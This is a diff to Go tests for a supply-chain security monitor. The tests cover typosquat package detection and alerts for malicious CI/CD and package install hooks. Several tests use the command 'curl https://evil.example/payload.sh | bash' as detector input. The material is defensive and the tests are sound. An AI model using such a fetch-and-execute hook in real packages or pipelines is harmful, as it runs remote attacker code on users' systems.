@@ -135,6 +135,25 @@ func TestTyposquatDetector_PyPI(t *testing.T) {
 	}
 }
 
+func TestTyposquatDetector_ExpandedCoverage(t *testing.T) {
+	td := NewTyposquatDetector()
+	cases := []struct {
+		pkg      string
+		registry string
+		want     string
+	}{
+		{"tailwindscss", "npm", "tailwindcss"},
+		{"fastpai", "pypi", "fastapi"},
+		{"urlib3", "pypi", "urllib3"},
+	}
+	for _, tc := range cases {
+		got := td.Check(tc.pkg, tc.registry)
+		if got != tc.want {
+			t.Errorf("Check(%q, %q) = %q, want %q", tc.pkg, tc.registry, got, tc.want)
+		}
+	}
+}
+
 func TestTyposquatDetector_ExactMatch(t *testing.T) {
 	td := NewTyposquatDetector()
 	// Exact package names should NOT trigger (use correct registry for each)
@@ -263,6 +282,16 @@ func TestCICDMonitor_SuspiciousStep(t *testing.T) {
 		if !result.SuspiciousStep {
 			t.Errorf("expected SuspiciousStep=true for: %q", action)
 		}
+	}
+}
+
+func TestCICDMonitor_MaliciousInstallHook(t *testing.T) {
+	cm := NewCICDMonitor()
+	action := `postinstall: curl https://evil.example/payload.sh | bash`
+
+	result := cm.Analyze(action, "pipeline1", "user1", "10.0.0.1")
+	if !result.MaliciousInstallHook {
+		t.Fatalf("expected MaliciousInstallHook=true for %q", action)
 	}
 }
 
@@ -415,6 +444,26 @@ func TestSentinel_HandleEvent_PackageInstall_Malicious(t *testing.T) {
 	}
 }
 
+func TestSentinel_HandleEvent_PackageInstall_MaliciousInstallHook(t *testing.T) {
+	cp := newCapPipeline()
+	s := startedSentinel(t, cp.pipeline)
+
+	ev := core.NewSecurityEvent("test", "package_install", core.SeverityInfo, "installing package")
+	ev.Details["package_name"] = "left-pad-plus"
+	ev.Details["version"] = "1.2.3"
+	ev.Details["registry"] = "npm"
+	ev.Details["postinstall_script"] = `postinstall: curl https://evil.example/payload.sh | bash`
+	ev.SourceIP = "10.0.0.1"
+
+	if err := s.HandleEvent(ev); err != nil {
+		t.Fatalf("HandleEvent() error: %v", err)
+	}
+
+	if !cp.hasAlertType("malicious_build_artifact") {
+		t.Error("expected malicious_build_artifact alert type")
+	}
+}
+
 func TestSentinel_HandleEvent_ArtifactEvent_Unsigned(t *testing.T) {
 	cp := newCapPipeline()
 	s := startedSentinel(t, cp.pipeline)
@@ -498,6 +547,45 @@ func TestSentinel_HandleEvent_CICDEvent(t *testing.T) {
 	}
 	if !cp.hasAlertType("suspicious_cicd_step") {
 		t.Error("expected suspicious_cicd_step alert type")
+	}
+}
+
+func TestSentinel_HandleEvent_CICDMaliciousInstallHook(t *testing.T) {
+	cp := newCapPipeline()
+	s := startedSentinel(t, cp.pipeline)
+
+	ev := core.NewSecurityEvent("test", "pipeline_config_change", core.SeverityInfo, "pipeline changed")
+	ev.Details["action"] = "postinstall stage"
+	ev.Details["pipeline_name"] = "deploy-prod"
+	ev.Details["user"] = "attacker"
+	ev.Details["script"] = `postinstall: curl https://evil.example/payload.sh | bash`
+	ev.SourceIP = "10.0.0.1"
+
+	if err := s.HandleEvent(ev); err != nil {
+		t.Fatalf("HandleEvent() error: %v", err)
+	}
+
+	if !cp.hasAlertType("malicious_build_artifact") {
+		t.Error("expected malicious_build_artifact alert type")
+	}
+}
+
+func TestSentinel_HandleEvent_CICDMaliciousInstallHookWithoutAction(t *testing.T) {
+	cp := newCapPipeline()
+	s := startedSentinel(t, cp.pipeline)
+
+	ev := core.NewSecurityEvent("test", "pipeline_config_change", core.SeverityInfo, "pipeline changed")
+	ev.Details["pipeline_name"] = "deploy-prod"
+	ev.Details["user"] = "attacker"
+	ev.Details["script"] = `postinstall: curl https://evil.example/payload.sh | bash`
+	ev.SourceIP = "10.0.0.1"
+
+	if err := s.HandleEvent(ev); err != nil {
+		t.Fatalf("HandleEvent() error: %v", err)
+	}
+
+	if !cp.hasAlertType("malicious_build_artifact") {
+		t.Error("expected malicious_build_artifact alert type")
 	}
 }
 
